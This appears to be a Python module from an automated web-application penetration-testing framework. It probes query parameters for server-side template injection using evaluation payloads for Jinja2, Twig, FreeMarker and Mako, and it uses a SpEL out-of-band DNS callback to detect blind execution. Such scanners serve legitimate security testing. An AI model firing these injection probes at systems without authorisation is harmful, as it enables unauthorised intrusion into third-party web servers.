"""
PolyglotSSTIAgent — Universal Polyglot & Error-Based Server-Side Template Injection Specialist.

Tests web application input fields with universal multi-engine polyglot payloads, parses
diagnostic error messages, and generates Out-Of-Band (OOB) DNS probes for blind SSTI detection across template engines.
"""
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse
from penflow.agents.base.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.infrastructure.oob_server import OOBCallbackServer, InteractionProtocol
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.polyglot_ssti")

SSTI_POLYGLOT_VECTORS = [
    {
        "id": "math_evaluation_probe",
        "name": "Mathematical Expression Evaluation Probe",
        "probe": "{{48239*71}}",
        "expected": "3424969",
        "engine": "Jinja2 / Twig / General Template Engine",
        "severity": "critical",
        "min_confidence": 0.98,
        "description": "Expression evaluates 48239 * 71 to produce unique integer 3424969 in server response."
    },
    {
        "id": "twig_jinja_disambiguator",
        "name": "Twig vs Jinja2 Expression Disambiguation",
        "probe": "{{7*'7'}}",
        "expected_jinja": "7777777",
        "expected_twig": "49",
        "severity": "critical",
        "min_confidence": 0.96,
        "description": "Expression evaluates to '49' in Twig or '7777777' in Jinja2, conclusively identifying the engine."
    },
    {
        "id": "freemarker_bracket_syntax",
        "name": "FreeMarker Bracket & Directive Evaluation",
        "probe": "[#ftl][#assign pf_x=8943721]${pf_x}",
        "expected": "8943721",
        "engine": "FreeMarker / Java",
        "severity": "critical",
        "min_confidence": 0.98,
        "description": "FreeMarker alternative square-bracket syntax assigns variable and renders 8943721."
    },
    {
        "id": "mako_string_concat",
        "name": "Mako / Python String Concatenation Probe",
        "probe": "${'penflow_' + 'ssti_rce_981'}",
        "expected": "penflow_ssti_rce_981",
        "engine": "Mako / Python Template Engine",
        "severity": "critical",
        "min_confidence": 0.98,
        "description": "Evaluates dynamic string concatenation to render concatenated marker in response."
    },
    {
        "id": "blind_ssti_oob_dns",
        "name": "Blind SSTI Out-Of-Band DNS/HTTP Resolution Probe",
        "probe": "oob_probe",
        "severity": "critical",
        "min_confidence": 0.94,
        "description": "Executes template expression triggering external DNS/HTTP resolution to verify blind code execution."
    }
]

class PolyglotSSTIAgent(BaseCapabilityAgent):
    def __init__(self, priority: int = 10, **kwargs):
        super().__init__(agent_name="PolyglotSSTIAgent", priority=priority, **kwargs)

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(
                id="polyglot_ssti",
                name="Polyglot & Error-Based SSTI Specialist",
                description="Audits template evaluation parameters using universal polyglot probes and differential mathematical evaluation proof.",
                version="1.0.0",
                tags=["ssti", "template-injection", "polyglot", "error-based", "oob"]
            )
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[PolyglotSSTIAgent] Executing capability '{capability_id}' on asset '{context.asset}'")

        http_client = context.get_http_client()
        target_urls = self._collect_endpoints(context)

        results: List[Dict[str, Any]] = []
        is_vulnerable = False
        max_confidence = 0.0
        best_target = target_urls[0] if target_urls else f"https://{context.asset}"
        best_reasoning = "SSTI polyglot probes safely evaluated without template injection execution."

        oob_server = OOBCallbackServer.get_instance()

        for endpoint in target_urls[:6]:
            param_names = ["q", "search", "template", "name", "view", "render", "msg", "id", "comment"]

            for param in param_names[:4]:
                # Phase 0: Measure baseline response with a neutral control probe
                base_url = f"{endpoint}?{param}=penflow_ctrl_10293" if "?" not in endpoint else f"{endpoint}&{param}=penflow_ctrl_10293"
                try:
                    exch_base = await http_client.send_as_identity(
                        identity_id="anonymous_guest",
                        method="GET",
                        url=base_url
                    )
                    resp_base = exch_base.response
                    if not resp_base or resp_base.status_code != 200:
                        continue
                    base_body = resp_base.body_text or resp_base.body_snippet or ""
                except Exception as e:
                    logger.debug(f"[PolyglotSSTIAgent] Baseline failed on {base_url}: {e}")
                    continue

                for vec in SSTI_POLYGLOT_VECTORS:
                    if vec["probe"] == "oob_probe":
                        oob_token = oob_server.generate_token(
                            agent_name="polyglot_ssti",
                            scan_id=getattr(context, "session_id", "scan01") or "scan01",
                            target_url=endpoint,
                            parameter_name=param,
                            protocol=InteractionProtocol.DNS
                        )
                        dns_payload = oob_server.get_dns_payload(oob_token)
                        probe_syntax = f"${{{{T(java.net.InetAddress).getByName('{dns_payload}')}}}}"
                    else:
                        probe_syntax = vec["probe"]
                        oob_token = None

                    test_url = f"{endpoint}?{param}={probe_syntax}" if "?" not in endpoint else f"{endpoint}&{param}={probe_syntax}"
                    try:
                        exch = await http_client.send_as_identity(
                            identity_id="anonymous_guest",
                            method="GET",
                            url=test_url
                        )
                        resp = exch.response
                        if not resp or resp.status_code != 200:
                            continue

                        body_text = resp.body_text or resp.body_snippet or ""
                        exch_dict = exch.to_dict()

                        # Evaluate if template expression actually executed server-side
                        evaluated = False
                        engine_found = "unknown"

                        if vec["id"] == "math_evaluation_probe":
                            # 48239 * 71 = 3424969
                            expected_val = vec["expected"]
                            if expected_val in body_text and expected_val not in base_body and probe_syntax not in body_text:
                                evaluated = True
                                engine_found = vec["engine"]

                        elif vec["id"] == "twig_jinja_disambiguator":
                            # {{7*'7'}} -> '7777777' (Jinja2) or '49' (Twig)
                            if "7777777" in body_text and "7777777" not in base_body:
                                evaluated = True
                                engine_found = "Jinja2 / Python"
                            elif "49" in body_text and "49" not in base_body and "{{7*'7'}}" not in body_text:
                                evaluated = True
                                engine_found = "Twig / PHP"

                        elif vec["id"] == "freemarker_bracket_syntax":
                            expected_val = vec["expected"]
                            if expected_val in body_text and expected_val not in base_body and "[#assign" not in body_text:
                                evaluated = True
                                engine_found = vec["engine"]

                        elif vec["id"] == "mako_string_concat":
                            expected_val = vec["expected"]
                            if expected_val in body_text and expected_val not in base_body and "${'penflow_" not in body_text:
                                evaluated = True
                                engine_found = vec["engine"]

                        elif vec["id"] == "blind_ssti_oob_dns" and oob_token:
                            oob_hit = await oob_server.wait_for_interaction(oob_token, timeout=1.0)
                            if oob_hit:
                                evaluated = True
                                engine_found = "Java Spring / SpEL OOB"

                        if evaluated:
                            is_vulnerable = True
                            confidence = vec["min_confidence"]
                            reasoning = f"CRITICAL SSTI Confirmed [{engine_found}]: Parameter '{param}' on '{endpoint}' evaluated expression to '{vec.get('expected', engine_found)}' in response."

                            if confidence > max_confidence:
                                max_confidence = confidence
                                best_target = test_url
                                best_reasoning = reasoning

                            results.append({
                                "vector_id": vec["id"],
                                "vector_name": vec["name"],
                                "probe_syntax": probe_syntax,
                                "endpoint": endpoint,
                                "parameter": param,
                                "engine_detected": engine_found,
                                "oob_token": oob_token,
                                "vulnerability_type": "polyglot_ssti",
                                "severity": vec["severity"],
                                "confidence": confidence,
                                "description": reasoning,
                                "is_vulnerable": True,
                                "_exchange_obj": exch_dict,
                                "evidence_exchanges": [exch_base.to_dict(), exch_dict]
                            })
                            break
                    except Exception as e:
                        logger.debug(f"[PolyglotSSTIAgent] SSTI probe error on {test_url}: {e}")

                if is_vulnerable:
                    break
            if is_vulnerable:
                break

        from penflow.capabilities.result import AgentExecutionResult
        return AgentExecutionResult(
            agent=self.name,
            capability=capability_id,
            asset=context.asset,
            status="COMPLETED",
            is_vulnerable=is_vulnerable,
            confidence_score=max_confidence if is_vulnerable else 0.0,
            reasoning=best_reasoning,
            target_url=best_target,
            findings=results,
            evidence={
                "vulnerability_type": "polyglot_ssti",
                "findings": results,
                "target_url": best_target,
                "confidence": max_confidence if is_vulnerable else 0.0,
                "is_vulnerable": is_vulnerable,
                "evidence_exchanges": [e for r in results for e in r.get("evidence_exchanges", [])]
            }
        ).to_dict()

    def _collect_endpoints(self, context: CapabilityExecutionContext) -> List[str]:
        target = context.asset if hasattr(context, "asset") else "example.com"
        target_url = target if target.startswith("http") else f"https://{target}"
        endpoints = [target_url]

        if hasattr(context, "observations") and context.observations:
            for obs in context.observations:
                data = obs.get("data", {}) if isinstance(obs, dict) else {}
                if isinstance(data, dict):
                    for ep in data.get("endpoints", []):
                        if isinstance(ep, dict) and ep.get("url"):
                            endpoints.append(ep["url"])

        if hasattr(context, "shared_cache") and context.shared_cache:
            mapped = context.shared_cache.get("endpoint_mapping", [])
            for ep in mapped:
                if isinstance(ep, str) and ep.startswith("http"):
                    endpoints.append(ep)
                elif isinstance(ep, dict) and "url" in ep:
                    endpoints.append(ep["url"])

        return list(dict.fromkeys(endpoints))

